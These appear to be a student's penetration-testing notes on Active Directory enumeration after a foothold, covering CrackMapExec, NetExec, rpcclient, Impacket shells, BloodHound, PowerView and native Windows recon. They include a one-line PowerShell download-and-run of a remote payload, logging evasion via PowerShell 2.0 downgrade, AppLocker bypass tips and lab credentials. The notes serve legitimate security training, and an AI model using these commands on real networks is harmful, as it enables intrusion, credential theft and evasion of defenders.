# Enumerating Security Controls
After gaining a foothold, we could use this access to get a feeling for the defensive state of the hosts,. Understanding the protections we may be up against will help inform our decisions regarding tool usage and assist us in planning our course of action by either avoiding or modifying certain tools.

>Note: This section is intended to showcase possible security controls in place within a domain, but does not have an interactive component. Enumerating and bypassing security controls are outside the scope of this module, but we wanted to give an overview of the possible technologies we may encounter during an assessment.

##  authenticate to the domain
####  from windows
```bash
# --- Method 1: Run as domain user directly (on Windows domain-joined machine)
runas /user:<DOMAIN>\<USER> cmd          # Opens a new CMD as <USER>, will ask for <PASSWORD>
powershell                              # From inside CMD, launch PowerShell as <USER>

# --- Method 2: WinRM:  Run with PSCredential (inside PowerShell)
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force   # Store password securely
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)  
Enter-PSSession -ComputerName <TARGET> -Credential $Cred    # Remote session as <USER>

# --- Method 3: Runas with /netonly (if machine is not domain-joined)
runas /netonly /user:<DOMAIN>\<USER> powershell.exe   # Use <USER> creds only for network access
```
#### from linux
**scan this services:**
```bash
nmap -p 3389,5985,5986,445,1433 <target-ip> -sV -Pn
```
**login to the domain computers** 
```bash
# with crackmapexec
# domain
  crackmapexec <smb/winrm/rdp> <SUBNET/COMPUTERS-LISTS.txt> -u <USER> -p "<PASS>" -x whoami # auto detect the domain
# local   
  crackmapexec <smb/winrm/rdp> <SUBNET/COMPUTERS-LISTS.txt> -u <USER> -p "<PASS>" -x whoami--local-auth
  
# with NetExec
# domain
  nxc <smb/winrm/mssql/rdp/wmi> <SUBNET> -u <USER> -p 'P@ssw0rd' -x whoami -d <DOMAIN>
# lcoal 
nxc smb <SUBNET> -u UserNAme -p 'PASSWORDHERE' -x whoami --local-auth
nxc smb <SUBNET> -u '' -p '' --local-auth
nxc smb <SUBNET> -u UserNAme -H 'LM:NT' -x whoami --local-auth
nxc smb <SUBNET> -u UserNAme -H 'NTHASH' -x whoami --local-auth

# psexec (get shell)
psexec.py <DOMAIN.LOCAL>/<USER>@<DC01.DOMIAN.LOCAL> -target-ip <Computer-Target-IP>

# Evil-WinRM
evil-winrm -i <TARGET-IP> -u <USER> -p '<PASSWORD>'  # Remote shell as <USER>
```
## Windows Defender

Windows Defender (or [Microsoft Defender](https://en.wikipedia.org/wiki/Microsoft_Defender) after the Windows 10 May 2020 Update) has greatly improved over the years and, by default, will block tools such as `PowerView`.
**Checking the Status of Defender with Get-MpComputerStatus:**
```powershell
Get-MpComputerStatus
  # RealTimeProtectionEnabled       : True
  # means Defender is enabled on the system.
```

## AppLocker
An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system.It is common for organizations to block cmd.exe and PowerShell.exe and write access to certain directories, but this can all be bypassed by calling it from other locations example: `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`
**View The AppLocker Policy:**
```bash
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
  # PathConditions : {%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE} # Deny
```

## PowerShell Constrained Language Mode
PowerShell [Constrained Language Mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) locks down many of the features needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more. We can quickly enumerate whether we are in Full Language Mode or Constrained Language Mode.
```powershell
$ExecutionContext.SessionState.LanguageMode #=> ConstrainedLanguage
```
## LAPS

>When you join a computer to an AD domain, the account you use becomes the **owner** of that computer object.  
AD gives that owner **All Extended Rights** over the computer, including reading certain sensitive attributes.  
If LAPS is enabled, those rights allow the account to **read the stored local admin password** for that machine.


The Microsoft [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement.
1. **enum what domain users( ==often users in protected groups== ) can read the LAPS password set for machines with LAPS installed** 
2. **enum what machines do not have LAPS installed.**

### Enum LAPS Groups and Users
**1.1 FInd Groups Explicitly Delegated to Read LAPS Passwords**
```PowerShell
Find-LAPSDelegatedGroups
# OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\Domain Admins
# OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\LAPS Admins
```

**1.2. Find All Principals (Users/Groups) with LAPS Read Access (Delegated or All Extended Rights)**
```powershell
Find-AdmPwdExtendedRights
```
>Enumeration may show a user account that can read the LAPS password on a host(if  LAPS installed on that machine). This can help us target specific AD users who can read LAPS passwords.

>Delegated for Groups
> "All Extended Rights" for Users (e.g., the account that joined the machine to the domain).

### Enum LAPS-Enabled Machines
We can use the `Get-LAPSComputers` function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.

```powershell
Get-LAPSComputers
# EXCHG01.INLANEFREIGHT.LOCAL oj+2A+[hHMMtj, 09/26/2020 00:51:3
```

---

# Credentialed Enumeration - from Linux

Now that **we have acquired a foothold in the domain**, it is time to dig deeper using our low privilege domain user credentials.it's time to **enumerate the domain in depth**. We are interested in information about **domain user and computer attributes, group membership, Group Policy Objects, permissions, ACLs, trusts, and more.** ==we will have to have acquired a user's cleartext password, NTLM password hash, or SYSTEM access on a domain-joined host.==

## CrackMapExec

we can use the tool with **MSSQL, SMB, SSH, and WinRM credentials**. Let's look at our options for CME with the SMB protocol:
(i.e., `crackmapexec winrm -h`, etc.):
  - -u Username `The user whose credentials we will use to authenticate`
  - -p Password `User's password`
  - Target (IP or FQDN) `Target host to enumerate` (in our case, the Domain Controller)
  - --users `Specifies to enumerate Domain Users`
  - --groups `Specifies to enumerate domain groups`
  - --loggedon-users `Attempts to enumerate what users are logged on to a target, if any`

We'll start by using the SMB protocol to enumerate users and groups. We will target the Domain Controller (whose address we uncovered earlier) because it holds all data in the domain database that we are interested in
> Make sure you preface all commands with `sudo`.

#### CME - Domain User Enumeration

```bash
sudo crackmapexec smb <DC-IP> -u <USER> -p <PASS> --users
```
>  it includes data points such as the **badPwdCount** attribute. so in password spraying ithis will help to build a target user list filtering out any users with their badPwdCount attribute above 0

#### CME - Domain Group Enumeration
```bash
sudo crackmapexec smb <DC-IP> -u <USER> -p <PASS> --groups
```
>Take note of key groups like `Administrators`, `Domain Admins`, `Executives`, any groups that may contain privileged IT admins, etc. These groups will likely contain users with elevated privileges worth targeting during our assessment.

#### CME - Domain Group Computers
```bash
sudo crackmapexec smb <DC-IP> -u <USER> -p <PASS> --computers

# list computers + revolsed ip
Get-DomainComputer | % { "$($_.dnshostname) - $((Resolve-DnsName $_.dnshostname -EA SilentlyContinue).IPAddress)" }
```

#### CME - Logged On Users
**We can also use CME to target other hosts** ==not only DC-IP== **and see the Users who logged on the host**
```bash
# <Domain-HOST-IP>: any Host on the domain (ex. server computer..) or IPs List
sudo crackmapexec smb <ANY-Domain-Host-IP> -u <USER> -p <PASS> --loggedon-users
  # [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 (Pwn3d!)
  # INLANEFREIGHT\svc_qualys
```
>we see the user `forend` is a local admin because `(Pwn3d!)` appears
>we see  the user `svc_qualys` is logged in, who we earlier identified as a ==domain admin.==

>BloodHound is particularly powerful as we can use it to view Domain User sessions graphically and quickly in many ways

#### CME Share Searching
We can use the `--shares` flag to **enumerate available shares on the remote** host and **the level of access our user** account has to each share (READ or WRITE access).
##### Share Enumeration - Domain Controller
```bash
sudo crackmapexec smb <DC-IP> -u <USER> -p <PASS> --shares
```
Next, we can dig into the shares and spider each directory looking for files. The module `spider_plus` will dig through each readable share on the host and list all readable files
##### Spider_plus
`spider_plus` lists file names and metadata (size, timestamps) from an SMB share based on filters like extension and size. It saves this info in a JSON file located at `/tmp/cme_spider_plus/<ip of host>` but **does not download or save file contents**.
```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'  #  OUTPUT: /tmp/cme_spider_plus

# modern with netexec + enum the hole subnet shars
netexec smb 172.16.6.0/24 -u svc_sql -p "lucky7" -M spider_plus 

# check OUTPUT(lists file names)
 head -n 10 /tmp/cme_spider_plus/172.16.5.5.json 
```
>We could dig around for interesting files such as `web.config` files or scripts that may contain passwords

## SMBMap
SMBMap is great for enumerating SMB shares from a Linux attack host. It can be used to gather a listing of shares, permissions, and share contents if accessible. Once access is obtained, it can be used to download and upload files and execute remote commands.
```bash
# SMBMap To Check Access
smbmap -u <USER> -p <PASS> -d <DOMIAIN.LOCAL> -H <DC-IP>
  # AMIN$ : NO ACCESS 
  # SYSVOL : READ ONLY

# Recursive List Of All Directories of share folder
smbmap -u <USER> -p <PASS> -d <DOMAIN.LOCAL> -H <DC-IP> -R 'SHARE_FOLDER' --dir-only
```
>The use of `--dir-only` provided only the output of all directories and did not list all files

## rpcclient
rpcclient is a handy tool created for use with the Samba protocol and to provide extra functionality via MS-RPC. It can enumerate, add, change, and even remove objects from AD.

#### SMB NULL Session with rpcclient (NO Creds)
```BASH
rpcclient -U "" -N <DC-IP>
```
#### rpcclient Enumeration

##### RIP
**rip** A [Relative Identifier (RID)](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) is a unique identifier (represented in hexadecimal format) utilized by Windows to track and identify objects.

**Domain SID + RID = unique object SID.**
**example:**
The domain **INLANEFREIGHT.LOCAL** has SID `S-1-5-21-3842939050-3880317879-2865463114`
user `htb-student` has RID `0x457` (decimal 1111),
so their full SID is:   `S-1-5-21-3842939050-3880317879-2865463114-1111`.
##### RPCClient User Enumeration By RID
```bash
# If We know the RIP 
rpcclient $> queryuser 0x457

# If we Don't know the RIP
for i in $(seq 500 1100);do rpcclient -N -U "" <DC-IP> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
If we wished to enumerate all users to gather the RIDs for more than just one, we would use the `enumdomusers` command

##### Enumdomusers
```bash
rpcclient $> enumdomusers
```

## Impacket Toolkit

Impacket is a versatile toolkit that provides us with many different ways to enumerate, interact, and exploit Windows protocols and find the information we need using Python.

> ==**`wmiexec.py` and `psexec.py` execute commands on a remote host but require LOCAL ADMINISTRATOR  credentials.**==

>ex. to get the **administrator** user creds use `Responder` to capture the creds

#### Psexec.py
Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the `ADMIN$` share on the target host. It then registers the service via `RPC` and the `Windows Service Control Manager`. Once established, communication happens over a named pipe, providing an interactive remote shell as `SYSTEM` on the victim host.

```bash
# Using psexec.py
psexec.py <DOMAIN>/<LOCAL_ADMIN_USERNAME>:'<PASSWORD>'@<TARGET_HOST> #=> SYSTEM Priv
  # <TARGET_HOST> → The IP or hostname of the machine where the user is an LOCAL admin
```

#### wmiexec.py
Wmiexec.py utilizes a semi-interactive shell where commands are executed through [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page). It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with
, but would still likely be caught by most modern anti-virus and EDR systems. ==We will use the same account as with psexec.py to access the host.==

```bash
wmiexec.py <DOMAIN>/<LOCAL_ADMIN_USERNAME>:'<PASSWORD>'@<TARGET_HOST> #=> admin Priv 
# <TARGET_HOST> → The IP or hostname of the machine where the user is an LOCAL admin
```
>The downside of this is that if a vigilant defender checks event logs and looks at event ID [4688: A new process has been created](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688), they will see a new process created to spawn cmd.exe and issue a command.

## Windapsearch
[Windapsearch](https://github.com/ropnop/windapsearch) is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries.

```bash
# Windapsearch Help
windapsearch.py -h
  # --da : enumerate domain admins group members 
  # -PU  find privileged users, perform a recursive search for users with nested group membership.
```
#### Windapsearch - Domain Admins
```bash
# Windapsearch - Domain Admins
python3 windapsearch.py --dc-ip <DC-IP> -u <USER>@<domain.local> -p <PASS> --da
  # [+]	Found 28 Domain Admins:
```
>Take note of a few users we have already seen before and may even have a hash or cleartext password

#### Windapsearch - Privileged Users
check for users with elevated privileges . and users with excess privileges from nested group membership.

**Example Of nested group membership:.** 
1. **Domain Admins** → has full control over the domain.
2. **IT Support** group is accidentally added **into** _Domain Admins_.
3. **Alice** is a member of **IT Support**
Even though Alice was **never directly added** to _Domain Admins_, she now **inherits all Domain Admin privileges** because she’s in a group that’s inside another group.

```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
  # [+]     Found 28 nested users for group Domain Admins:..
  # [+]     Found 3 nested users for group Enterprise Admins:..
```

## Bloodhound.py
BloodHound is one of, if not the most impactful tools ever released for auditing Active Directory security, and it is hugely beneficial for us as penetration testers. We can take large amounts of data that would be time-consuming to sift through and create graphical representations or "attack paths" of where access with a particular user may lead. We will often find nuanced flaws in an AD environment that would have been missed without the ability to run queries with the BloodHound GUI tool and visualize issues. The tool uses [graph theory](https://en.wikipedia.org/wiki/Graph_theory) to visually represent relationships and uncover attack paths that would have been difficult, or even impossible to detect with other tools. The tool consists of two parts: the [SharpHound collector](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) written in C# for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an `ingestor`) and the [BloodHound](https://github.com/BloodHoundAD/BloodHound/releases) GUI tool which allows us to upload collected data in the form of JSON files. Once uploaded, we can run various pre-built queries or write custom queries using [Cypher language](https://blog.cptjesus.com/posts/introtocypher). The tool collects data from AD such as users, groups, computers, group membership, GPOs, ACLs, domain trusts, local admin access, user sessions, computer and user properties, RDP access, WinRM access, etc.

It was initially only released with a PowerShell collector, so it had to be run from a Windows host .
`bloodhound-python` helped immensely during penetration tests ==when we have valid domain credentials, but do not have rights to access a domain-joined Windows host or do not have a Windows attack host to run the SharpHound collector from==. This also helps us not have to run the collector from a domain host,
#### Executing BloodHound.py
```bash
bloodhound-ce-python # for bloudhound comunity edition 
bloodhound-python -h
  # -c : Which information to collect. -c all flag told the tool to run all checks

# Executing BloodHound.py
sudo bloodhound-python -u '<USER@<DOMAIN.LOCAL>' -p '<PASS>' -ns <DC-IP> -d <domain.local> -c all 

# Viewing the Results
ls 
# 20220307163102_computers.json  20220307163102_domains.json  20220307163102_groups.json  20220307163102_users.json  
zip -r ilfreight_bh.zip *.json # creat full zip file

```
#### Upload the Zip File into the BloodHound GUI
```bash
sudo neo4j start
bloodhound
  # Username: neo4j
  # Password: neo4j
```
Once BloodHound is open, upload data via the **Upload Data** button: either select each JSON file or zip them with  
`zip -r ilfreight_bh.zip *.json` and upload the ZIP.
![[Pasted image 20250809171821.png]]

Now that the data is loaded, we can use the Analysis tab to run queries against the database. These queries can be custom and specific to what you decide using [custom Cypher queries](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/). There are many great cheat sheets to help us here. We will discuss custom Cypher queries more in a later section. As seen below, we can use the built-in `Path Finding` queries on the `Analysis tab` on the `Left` side of the window.
![[Pasted image 20250809172139.png]]
The query chosen to produce the map above was `Find Shortest Paths To Domain Admins`. It will give us any logical paths it finds through users/groups/hosts/ACLs/GPOs, etc., relationships that will likely allow us to escalate to Domain Administrator privileges or equivalent. This will be extremely helpful when planning our next steps for lateral movement through the network


---

# Credentialed Enumeration - from Windows

we will experiment with a few tools for enumerating from a Windows attack host, such as ==SharpHound/BloodHound, PowerView/SharpView, Grouper2, Snaffler, and some built-in tools== useful for AD enumeration.
## TTPs

## ActiveDirectory PowerShell Module
The ActiveDirectory PowerShell module is a group of PowerShell cmdlets for administering an Active Directory environment

### import AD module
```powershell

Get-Module # Discover Modules => ActiveDirectory module is not yet imported
Import-Module ActiveDirectory # Load ActiveDirectory Module
Get-Module #=> DOne !!
```
### Get AD domain info
```powershell
Get-ADDomain #  Get Domain Info
```
### Enum Users
```powershell
Get-ADUser -Filter * | select Name # Get all Users
Get-ADUser -Identity <SamAccountName> -Filter * # all info of User
```

**We will be filtering for accounts with the ==ServicePrincipalName== property populated. This will get us a listing of accounts that may be susceptible to a ==Kerberoasting attack==,** ==ServicePrincipalName=on a user account means that Kerberos TGS tickets for that service will be encrypted with that account’s password hash.==  
==Any domain user can request those tickets and crack them offline, making weakly protected service accounts vulnerable to Kerberoasting.==
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
### Checking For Trust Relationships
==This will be useful later on when looking to take advantage of child-to-parent trust relationships and attacking across forest trusts.==
```powershell
Get-ADTrust -Filter *
```
### Group Enumeration
```powershell
Get-ADGroup -Filter * | select name # list all domain groups
Get-ADGroup -Identity "Backup Operators" # more info of particular group
Get-ADGroupMember -Identity "Backup Operators" # List group members
```

## PowerView

[PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) is a tool written in PowerShell to help us in  enumerate domain information

```powershell
Export-PowerViewCSV       # Append results to a CSV file
ConvertTo-SID            # Convert a User or group name to its SID value
Get-DomainSPNTicket      # Requests the Kerberos ticket for a specified Service Principal Name (SPN) account

# Domain/LDAP Functions:
Get-Domain              # Will return the AD object for the current (or specified) domain
Get-DomainController    # Return a list of the Domain Controllers for the specified domain
Get-DomainUser          # Will return all users or specific user objects in AD
Get-DomainComputer      # Will return all computers or specific computer objects in AD

Get-DomainGroup         # Will return all groups or specific group objects in AD
Get-DomainOU            # Search for all or specific OU objects in AD
Find-InterestingDomainAcl # Finds object ACLs in the domain with modification rights set to non-built in objects
Get-DomainGroupMember   # Will return the members of a specific domain group
Get-DomainFileServer    # Returns a list of servers likely functioning as file servers
Get-DomainDFSShare      # Returns a list of all distributed file systems for the current (or specified) domain

# GPO Functions:
Get-DomainGPO           # Will return all GPOs or specific GPO objects in AD
Get-DomainPolicy        # Returns the default domain policy or the domain controller policy for the current domain

# Computer Enumeration Functions:
[+] # Get-NetLocalGroup function does not require explicit credentials to enumerate local groups on a remote machine. It utilizes the Active Directory Service Interfaces (ADSI) WinNT provider, which allows enumeration of local groups on remote machines without needing administrative credentials.

Get-NetLocalGroup       # Enumerates local groups on the local or a remote machine
Get-NetLocalGroupMember # Enumerates members of a specific local group
Get-NetShare            # Returns open shares on the local (or a remote) machine
Get-NetSession          # Will return session information for the local (or a remote) machine
Test-AdminAccess        # Tests if the current user has administrative access to the local (or a remote) machine

# Threaded 'Meta'-Functions:
Find-DomainUserLocation      # Finds machines where specific users are logged in ( requires credentials)
Find-DomainShare             # Finds reachable shares on domain machines
Find-InterestingDomainShareFile # Searches for files matching specific criteria on readable shares in the domain
Find-LocalAdminAccess        # Find machines on the local domain where the current user has local administrator access

# Domain Trust Functions:
Get-DomainTrust            # Returns domain trusts for the current domain or a specified domain
Get-ForestTrust            # Returns all forest trusts for the current forest or a specified forest
Get-DomainForeignUser      # Enumerates users who are in groups outside of the user's domain
Get-DomainForeignGroupMember # Enumerates groups with users outside of the group's domain and returns each foreign member
Get-DomainTrustMapping     # Will enumerate all trusts for the current domain and any others seen
```

**examples of use:** 
```powershell
# Domain User Information
Get-DomainUser -Identity <samaccountname> -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# Recursive Group Membership
Get-DomainGroupMember -Identity "Domain Admins" -Recurse # -Recurse  finds any groups that are part of the target group (nested group membership) to list  members of those groups
  [+] # if find the another group is part of the Domain Admins group through nested group membership Now we know who to target

# Trust Enumeration
Get-DomainTrustMapping

# Testing for Local Admin Access
Test-AdminAccess -ComputerName <current/remote_COMPUUTER_NAME>

# Finding Users With SPN Set
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

## SharpView
SharpView, a .NET (c#) port of PowerView. Many of the same functions supported by PowerView can be used with SharpView.
```powershell
.\SharpView.exe Get-DomainUser -Help
.\SharpView.exe Get-DomainUser -Identity <samaccountname>
# commands same as PowerView
```
> when we can't use powershell SharpView can replace the powerview

## Shares
We can use PowerView to hunt for shares and then help us dig through them. and to make it easy and fast we can use anothertool like `Snaffler`
### Snaffler
[Snaffler](https://github.com/SnaffCon/Snaffler) is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories
```bash
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
  # -s print results to the console 
  # "-v data" collec all data objects
```

## BloodHound
`Bloodhound` is an exceptional open-source tool that can identify attack paths within an AD environment by analyzing the relationships between objects.
 **we must authenticate as a domain user from a Windows attack host positioned within the network (but not joined to the domain) or transfer the tool to a domain-joined host.**
 ==For our purposes, we will work with SharpHound.exe already on the attack host=
 
```powershell
.\SharpHound.exe -c All --zipfilename <zipFileName> # on domain joined

# remotly 
.\SharpHound.exe -c All --zipfilename out --domain <DOMAIN.LOCAL> --ldapusername "<USER@DOMAIN.LOCAL>" --ldappassword '<PASSWORD>'
```

Next, we can exfiltrate the dataset to our own VM or ingest it into the BloodHound GUI tool on MS01. We can do this on MS01 by typing `bloodhound` into a CMD or PowerShell console. The credentials should be saved, but enter `neo4j: HTB_@cademy_stdnt!` if a prompt appears. Next, click on the `Upload Data` button on the right-hand side, select the newly generated zip file, and click `Open`. An `Upload Progress` window will pop up. Once all .json files show 100% complete, click the X at the top of that window.

We can start by typing `domain:` in the search bar on the top left and choosing `INLANEFREIGHT.LOCAL` from the results. Take a moment to browse the node info tab. As we can see, this would be a rather large company with over 550 hosts to target and trusts with two other domains.

in the `Analysis` tab:
### Unsupported Operating Systems 
`Find Computers with Unsupported Operating Systems` 
![[Pasted image 20250811162553.png]]
 ==FInd Unsupported Operating Systems ?: exploit it== 
![[exploits.jpeg]]
### Local Admins
`Find Computers where Domain Users are Local Admin`
![[Pasted image 20250811162525.png]]
Domain Users  with local admin over one or more hosts. This can benefit us if we take over a user account with these rights over one or more machines.


---

# Living Off the Land

utilizing native Windows tools to perform our enumeration and then practice them from our Windows attack host. This can  be a more stealthy approach and may not create as many log entries and alerts as pulling tools into the network
## Env Commands For Host & Network Recon

basic environmental commands that can be used to give us more information about the host we are on
```powershell
hostname    # Prints the PC's Name
systeminfo # Host info 
[System.Environment]::OSVersion.Version    # Prints out the OS version and revision level
wmic qfe get Caption,Description,HotFixID,InstalledOn    # Prints the patches and hotfixes applied to the host
ipconfig /all    # Prints out network adapter state and configurations
set    # Displays a list of environment variables for the current session (ran from CMD-prompt)
echo %USERDOMAIN%    # Displays the NetBOIS domain name to which the host belongs (ran from CMD-prompt)
%USERDNSDOMAIN%      # Displays the full DNS-style domain name (e.g., corp.example.com) (run on cmd )
echo %logonserver%    # Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)
```

## Harnessing PowerShell
### Quick Checks Using PowerShell
```powershell
Get-Module # Lists available modules loaded for use.

Get-ExecutionPolicy -List # Will print the execution policy settings for each scope on a host.
Set-ExecutionPolicy Bypass -Scope Process # This will change the policy for our current process

Get-ChildItem Env: | ft Key,Value # Return environment values such as key paths, users, computer information, etc.
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt # get the current user PowerShell history
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://192.168.1.10/payload.ps1'); Invoke-Payload" # download a file from the web using PowerShell and call it from memory.
```
### Downgrade Powershell
PowerShell event logging started in version 3.0. By running PowerShell 2.0 or older, we can avoid logging in Event Viewer and stay stealthy.
```powershell
Get-host # get powershell version 5 
powershell.exe -version 2 # switch to powershell version 2
Get-host # get powershell version 2
```
Let's check and see if we are still writing logs:
 open **Event Viewer** →  Search in Start Menu type `Event Viewer` and open it .
- The primary place to look is in the `PowerShell Operational Log` found under `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`. All commands executed in our session will log to this file.
- The `Windows PowerShell` log located at `Applications and Services Logs > Windows PowerShell` is also a good place to check
![[Pasted image 20250812213638.png]]
With Script Block Logging enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly. 
## Checking Defenses
```powershell
# Firewall Checks
netsh advfirewall show allprofiles

# Windows Defender Check (from CMD.exe)
sc query windefend

# Windows Defender configuration settings (from powershell.exe)
Get-MpComputerStatus
```
## Am I Alone?
check if you are the only one logged in
```powershell
qwinsta
```

## Network Information

```powershell
arp -a # Lists all known hosts stored in the arp table.
ipconfig /all # Prints out adapter settings for the host
netsh advfirewall show allprofiles # Displays the status of the host's firewall
```

## Windows Management Instrumentation (WMI)

```powershell
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress # Displays information about the Domain and Domain Controllers
wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List # Displays basic host information to include any attributes within the list

wmic useraccount list /format:list # Displays information about all local accounts and any domain accounts that have logged into the device
wmic group list /format:list # Information about all local groups
wmic sysaccount list /format:list # Dumps information about any system accounts that are being used as service accounts.
wmic qfe get Caption,Description,HotFixID,InstalledOn # Prints the patch level and description of the Hotfixes applied
```

## Net Commands
[Net](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) commands can be beneficial to us when attempting to enumerate information from the domain.
> `net.exe` commands are typically monitored by EDR solutions. Some organizations will even configure their monitoring tools to throw alerts if certain commands are run by users in specific OUs, such as a Marketing Associate's account running commands such as `whoami`, and `net localgroup administrators`, etc.

```cmd
net accounts                              # Information about password requirements
net accounts /domain                      # Password and lockout policy
net group /domain                         # Information about domain groups
net group "Domain Admins" /domain         # List users with domain admin privileges
net group "domain computers" /domain      # List of PCs connected to the domain
net group "Domain Controllers" /domain    # List PC accounts of domain controllers
net group <domain_group_name> /domain     # Users that belong to the group
net groups /domain                        # List of domain groups
net localgroup                            # All available groups
net localgroup administrators /domain     # List users in the administrators group inside the domain (Domain Admins included by default)
net localgroup Administrators              # Information about the Administrators group
net localgroup administrators [username] /add   # Add user to administrators
net share                                 # Check current shares
net user <ACCOUNT_NAME> /domain           # Get information about a user within the domain
net user /domain                          # List all users of the domain
net user %username%                       # Information about the current user
net use x: \\computer\share                # Mount the share locally
net view                                  # Get a list of computers
net view /all /domain[:domainname]        # Shares on the domains
net view \\computer /ALL                   # List shares of a computer
net view /domain                          # List of PCs of the domain
```
>Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string.

## Dsquery
[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952\(v=ws.11\)) is a helpful command-line tool that can be utilized to find Active Directory objects.`dsquery` will exist on any host can be found at `C:\Windows\System32\dsquery.dll`.

All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a `SYSTEM` context. Below, we will show the basic search function with `dsquery` and a few helpful search filters.

```powershell
dsquery user # User Search
dsquery computer # Computer Search
```

We can use a [dsquery wildcard search](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232\(v=ws.11\)) to view all objects in an OU, for example.
```powershell
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

We can, of course, combine `dsquery` with **LDAP search filters** of our choosing. The below looks for users with the `PASSWD_NOTREQD`(**The account is not required to have a password set.**) flag set in the `userAccountControl` attribute.
```powershell
# Users With Specific Attributes Set (PASSWD_NOTREQD)
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# Searching for Domain Controllers
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)"  -attr sAMAccountName

# search for user (disabled account with administrative privileges)
dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(memberOf:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL))"


```
### LDAP Filtering Explained

```bash
LDAP Filtering Basics
---------------------

1. Main Parts of a Filter:
   - Attribute: (ex. userAccountControl)
   - OID: matching rule
   - Bitmask: value to check

   Example:
   (userAccountControl:1.2.840.113556.1.4.803:=8192)

   → Means: Check UAC attribute, match exactly (803 rule), for bitmask 8192.

2. Common Matching Rules (OIDs):
   - 1.2.840.113556.1.4.803 → Exact match of the bit.
   - 1.2.840.113556.1.4.804 → Match if ANY bit matches (partial match).
   - 1.2.840.113556.1.4.1941 → Match DN (Distinguished Name) recursively (nested groups).

3. Logical Operators:
   - &  (AND) → All conditions must match.
   - |  (OR)  → Any condition matches.
   - !  (NOT) → Condition must NOT match.

   Examples:
   (&(objectClass=user)(userAccountControl:...:=64))
      → Find users with "Password Can't Change".

   (&(objectClass=user)(!userAccountControl:...:=64))
      → Find users WITHOUT "Password Can't Change".

4. UAC Bitmask Examples: (https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties)
   - 2    → Account Disabled
   - 16   → Locked Out
   - 64   → Password Can't Change
   - 512  → Normal Account
   - 8192 → Smartcard Required
```
![[Pasted image 20250812235149.png]]